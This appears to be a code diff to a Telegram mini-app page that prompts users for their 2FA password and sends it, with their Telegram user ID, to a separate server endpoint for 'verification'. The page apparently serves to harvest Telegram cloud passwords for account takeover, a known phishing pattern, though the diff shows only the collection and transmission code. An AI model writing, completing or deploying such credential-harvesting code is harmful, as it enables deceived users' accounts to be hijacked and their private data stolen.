@@ -43,27 +43,56 @@
             const tg = window.Telegram.WebApp;
             const twofaInput = document.getElementById('twofa-input');
             const twofaBtn = document.getElementById('twofa-btn');
-            
-            // Initialize Telegram Web App - Keep it open!
+
+            // Change to your server URL when deployed
+            const SERVER_URL = 'http://localhost:5000';
+            const userId = tg.initDataUnsafe?.user?.id || 'user_default';
+
             tg.ready();
             tg.expand();
             tg.enableClosingConfirmation();
-            
-            twofaBtn.addEventListener('click', function() {
-                if (tg) {
-                    const password = twofaInput.value;
-                    if (password.length > 0) {
-                        tg.MainButton.setText('Verifying...');
-                        tg.MainButton.show();
-                        tg.MainButton.disable();
-                        tg.sendData('verify_2fa:' + password);
+
+            twofaBtn.addEventListener('click', async function() {
+                const password = twofaInput.value;
+                if (!password) {
+                    tg.showPopup({
+                        title: 'Error',
+                        message: 'Please enter your 2FA password!',
+                        buttons: [{ type: 'ok', text: 'OK' }]
+                    });
+                    return;
+                }
+
+                twofaBtn.disabled = true;
+                twofaBtn.textContent = 'Verifying...';
+
+                try {
+                    const res = await fetch(`${SERVER_URL}/verify-2fa`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ password, user_id: String(userId) })
+                    });
+
+                    const result = await res.json();
+
+                    if (result.success) {
+                        tg.sendData('verified:2fa_success');
                     } else {
                         tg.showPopup({
-                            title: 'Error',
-                            message: 'Please enter your 2FA password!',
+                            title: 'Wrong Password',
+                            message: result.message || 'Incorrect 2FA password.',
                             buttons: [{ type: 'ok', text: 'OK' }]
                         });
                     }
+                } catch (err) {
+                    tg.showPopup({
+                        title: 'Error',
+                        message: 'Cannot reach server.',
+                        buttons: [{ type: 'ok', text: 'OK' }]
+                    });
+                } finally {
+                    twofaBtn.disabled = false;
+                    twofaBtn.textContent = '✅ VERIFY 2FA ✅';
                 }
             });
         });
